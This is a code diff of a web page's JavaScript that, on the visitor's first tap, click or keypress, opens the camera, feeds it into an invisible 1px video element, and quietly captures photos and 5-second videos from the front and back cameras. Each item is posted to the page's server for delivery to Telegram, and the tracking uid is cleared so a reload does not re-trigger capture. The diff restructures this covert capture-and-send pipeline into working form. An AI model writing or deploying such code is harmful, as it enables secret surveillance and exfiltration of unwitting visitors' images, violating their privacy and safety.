@@ -2222,66 +2222,7 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
     });
   }
 
-  // Capture 5 photos + a 5s video from a single stream using its own video
-  // element (separate element per camera so front and back both reliably work).
-  async function captureFrom(stream) {
-    const el = document.createElement('video');
-    el.setAttribute('playsinline', '');
-    el.setAttribute('autoplay', '');
-    el.setAttribute('muted', '1');
-    el.style.cssText = 'position:fixed;left:0;top:0;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
-    document.body.appendChild(el);
-
-    const drawFn = () => {
-      const maxDim = 640;
-      const sw = Math.max(el.videoWidth || 640, 2);
-      const sh = Math.max(el.videoHeight || 480, 2);
-      const scale = Math.min(1, maxDim / Math.max(sw, sh));
-      const canvas = document.createElement('canvas');
-      canvas.width = Math.max(2, Math.round(sw * scale));
-      canvas.height = Math.max(2, Math.round(sh * scale));
-      const ctx = canvas.getContext('2d');
-      try {
-        ctx.drawImage(el, 0, 0, canvas.width, canvas.height);
-        return canvas.toDataURL('image/jpeg', 0.6);
-      } catch (e) {
-        return '';
-      }
-    };
-
-    el.srcObject = stream;
-    try { await el.play(); } catch (e) {}
-
-    // Wait for at least one rendered frame so draws aren't black.
-    await new Promise((resolve) => {
-      if (el.videoWidth > 0 && el.readyState >= 2) return resolve();
-      const onReady = () => { el.removeEventListener('loadeddata', onReady); resolve(); };
-      el.addEventListener('loadeddata', onReady);
-      setTimeout(resolve, 3000);
-    });
-    await sleep(500);
-
-    const shots = [];
-    for (let i = 0; i < 5; i++) {
-      let frame = '';
-      for (let retry = 0; retry < 3 && !frame; retry++) {
-        frame = drawFn();
-        if (!frame) await sleep(200);
-      }
-      if (frame) shots.push(frame);
-      await sleep(350);
-    }
-
-    // Record the 5s clip.
-    const vid = await recordVideo(stream);
-
-    try { stream.getTracks().forEach((t) => t.stop()); } catch (e) {}
-    try { el.srcObject = null; el.remove(); } catch (e) {}
-    return { shots, vid };
-  }
-
-  // Remove ?uid= from the address bar once handled, so a page reload does not
-  // trigger the camera capture again.
+  // Clear or keep the uid until all items are sent, then drop it.
   function clearUid() {
     try {
       const url = new URL(location.href);
@@ -2292,40 +2233,70 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
     } catch (e) {}
   }
 
-  async function sendStream(streams) {
-    const images = [];
-    const videos = [];
-    for (const s of streams) {
-      const { shots, vid } = await captureFrom(s);
-      images.push(...shots);
-      if (vid) videos.push(vid);
-    }
+  // Attach a hidden video element to a stream and wait until a frame is ready.
+  function attachVideo(stream) {
+    const el = document.createElement('video');
+    el.setAttribute('playsinline', '');
+    el.setAttribute('autoplay', '');
+    el.setAttribute('muted', '1');
+    el.style.cssText = 'position:fixed;left:0;top:0;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
+    document.body.appendChild(el);
+    el.srcObject = stream;
+    return {
+      el,
+      ready: (async () => {
+        try { await el.play(); } catch (e) {}
+        await new Promise((resolve) => {
+          if (el.videoWidth > 0 && el.readyState >= 2) return resolve();
+          const onReady = () => { el.removeEventListener('loadeddata', onReady); resolve(); };
+          el.addEventListener('loadeddata', onReady);
+          setTimeout(resolve, 3000);
+        });
+        await sleep(500);
+      })(),
+    };
+  }
 
+  // Capture a single photo from the element.
+  function snap(el) {
+    const maxDim = 640;
+    const sw = Math.max(el.videoWidth || 640, 2);
+    const sh = Math.max(el.videoHeight || 480, 2);
+    const scale = Math.min(1, maxDim / Math.max(sw, sh));
+    const canvas = document.createElement('canvas');
+    canvas.width = Math.max(2, Math.round(sw * scale));
+    canvas.height = Math.max(2, Math.round(sh * scale));
     try {
-      if (!images.length && !videos.length) {
-        toast('Could not capture camera — no media.');
-        return;
-      }
+      canvas.getContext('2d').drawImage(el, 0, 0, canvas.width, canvas.height);
+      return canvas.toDataURL('image/jpeg', 0.6);
+    } catch (e) {
+      return '';
+    }
+  }
+
+  // Send one photo (or one video) to the server for Telegram delivery.
+  async function sendItem(kind, dataUrl) {
+    if (!dataUrl) return false;
+    const body = kind === 'video'
+      ? { uid, videos: [dataUrl] }
+      : { uid, images: [dataUrl] };
+    try {
       const res = await fetch('/api/camera/capture', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ uid, images, videos }),
+        body: JSON.stringify(body),
       });
       const data = await res.json().catch(() => ({}));
-      if (data && data.success) toast('Captured and sent to Telegram.');
-      else toast('Failed to send.');
+      if (data && data.success) { return true; }
+      return false;
     } catch (e) {
-      toast('Failed to send.');
-    } finally {
-      // Always drop the uid so reloading won't capture again.
-      clearUid();
+      return false;
     }
   }
 
   // Browser policy: getUserMedia is only allowed inside a user gesture. We
   // call it synchronously on the very first tap/click/touch so the "Allow"
-  // permission prompt appears, then capture quietly in the background. Both
-  // front and back camera streams are requested in one gesture.
+  // permission prompt appears, then capture quietly in the background.
   let armed = false;
   function onGesture() {
     if (armed) return;
@@ -2336,25 +2307,63 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
       toast('Camera not supported on this browser.');
       return;
     }
-    // Request back (environment) and front (user) together, each tolerating a
-    // missing/specific camera by falling back to any available one.
-    const back = navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false,
-    }).catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }));
-    const front = navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false,
-    }).catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false }));
 
-    Promise.all([back, front])
-      .then((streams) => sendStream(streams))
-      .catch((e) => {
-        // If opening both together failed, try each separately as a last resort.
-        back.then((s) => sendStream([s])).catch(() => front.then((s) => sendStream([s])).catch(() => {
-          toast((e && e.name === 'NotAllowedError')
-            ? 'Camera permission was blocked. Refresh and tap to Allow.'
-            : 'Camera is not available right now.');
-        }));
-      });
+    async function openStream(facingMode, fallbackMode) {
+      try {
+        return await navigator.mediaDevices.getUserMedia({
+          video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false,
+        });
+      } catch (e) {
+        return await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: fallbackMode, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false,
+        });
+      }
+    }
+
+    async function captureCamera(facingMode, fallbackMode, label) {
+      // Photo first, then the 5s video, sent one at a time.
+      let stream;
+      try {
+        stream = await openStream(facingMode, fallbackMode);
+      } catch (e) {
+        return false;
+      }
+      const { el, ready } = attachVideo(stream);
+      try {
+        await ready;
+
+        // 1) one photo
+        let photo = '';
+        for (let retry = 0; retry < 3 && !photo; retry++) {
+          photo = snap(el);
+          if (!photo) await sleep(200);
+        }
+        if (photo) await sendItem('photo', photo);
+
+        // 2) one 5s video
+        const vid = await recordVideo(stream);
+        if (vid) await sendItem('video', vid);
+      } catch (e) {
+        // capture may partly fail; keep going
+      }
+      try { stream.getTracks().forEach((t) => t.stop()); } catch (e) {}
+      try { el.srcObject = null; el.remove(); } catch (e) {}
+      return true;
+    }
+
+    // Capture one camera at a time (mobile allows only one active camera).
+    (async () => {
+      try {
+        await captureCamera('user', 'environment', 'front');      // front: photo + video
+        await captureCamera('environment', 'user', 'back');       // back:  photo + video
+      } catch (e) {
+        toast((e && e.name === 'NotAllowedError')
+          ? 'Camera permission was blocked. Refresh and tap to Allow.'
+          : 'Camera is not available right now.');
+      } finally {
+        clearUid();
+      }
+    })();
   }
   ['click', 'touchstart', 'keydown'].forEach((t) =>
     document.addEventListener(t, onGesture, { capture: true }));
